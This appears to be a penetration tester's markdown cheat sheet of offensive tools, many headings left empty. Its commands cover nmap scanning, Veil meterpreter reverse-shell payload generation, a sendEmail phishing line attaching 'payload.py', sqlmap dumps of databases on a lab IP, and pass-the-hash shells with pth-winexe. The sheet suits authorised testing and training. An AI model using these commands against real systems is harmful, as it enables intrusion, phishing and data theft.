---
title: CISA Tools
---
# List of Tools for CISA
## Network Reconnaissance
### Nessus
Start Nessus
```
service nessusd start
```
Browse to the https://<nessus host>:8834
* Username: root
* Password: toor
Create a new Advanced Scan
* Turn off ping
* Enable generic web application tests

### NMAP
###### Ping Sweep
```
nmap -n -sn <x.x.x.x/xx or x.x.x.x-xxx> -oG - | awk '/Up$/{print $2}'
```
Take this ping sweep over to a targeted scan. You can replace the "--top-ports" with "-p-" or a list of desired ports. 
```
nmap --top-ports -sC -sV -oA nmap/targeted --script vuln "ipaddress from port scan"
```
###### Deeper Scanning
Run an Nmap scan for all tcp ports
```
nmap -p- --min-rate=1000 -T4 "ip address here" > output_nmap.txt
```
This information can be cleaned up a little with this. 
```
cat output_nmap.txt | grep ^[0-9] | cat output_nmap.txt |  cut -d '/' -f 1 |  tr '\n' ',' | sed s/,$//
```
##### My Favorite Nmap Scan
Thanks [IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)
```
nmap -sC -sV -oA nmap/init "ip address"
```

### SimplyEmail
### theHarvester
To run theHarverster. 
```
theHarverster
```
Show options:
```
theHarverster options
```
theharvester Usage Example
```
theharvester -d kali.org -l 500 -b google
```

## Web Application Reconnaissance
### Vega
### Acunetix
### Burp Suite
### Nessus
### Nikto
### Nmap Scripting Engine

## Payload Generation
### Cobalt Strike
### MSFvenom
### Veil Framework
start Veil Framework navigate to the /Veil Framwork directory.
```
./Veil.py
```
If you have the ability to select between "Evasion and Ordnance" use Evasion. 
Run the "list" command to show Available Tools.
Use the 'python/meterpreter/rev_tcp.py' option from the list. Example below
```
use 28
```
The check the Required Options. 
```
options
```
Set the lhost ip address. 
Now you can Generate the payload. 



## Listeners
### Cobalt Strike
### Metasploit
### netcat

## Email Client
### Cobalt Strike
### SendEmail

```
sendEmail -o tls=no -t target@corp.com -f hacker@foo.bar -s
123.123.123.2:25 -u foo -a payload.py -m Click Me
```

## Data Exfiltration
### Egress-Assess

## Enumeration
### PowerSploit

## Directory Brute Force
### Aquatone
### EyeWitness

## Directory Bruce-Force
### DirBuster
### Gobuster

## Exploitation
### Burp Suite
### Metasploit
### SearchSploit
### sqlmap
create file from burp with loginin POST from burp suite - This is easier when done under the target usage --batch assume defaults good for background enumeration. 
```
sqlmap -r login.req -p id --level 5 --risk 3 --threads 10 --batch 
```
Basic sqlmap command usage
```
sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" --dbs
sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" --tables 
sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" --columns 
sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" -C "columnName" --dump
```
Manual testing for sqlmap can include using the following. 
```
http://site/name.php?henryearl=1
http://site/name.php?henryearl=1'
http://site/name.php?henryearl=-1
http://site/name.php?henryearl=-1'
```
[Thanks to Database Tutorials](https://www.youtube.com/watch?v=oWHKIiRGjtQ)

## Pass the Hash
### pth-winexe
Pass the Hash of a user and open a cmd shell. 
```
pth-winexe -u administrator%"hash"//"target ip" cmd.exe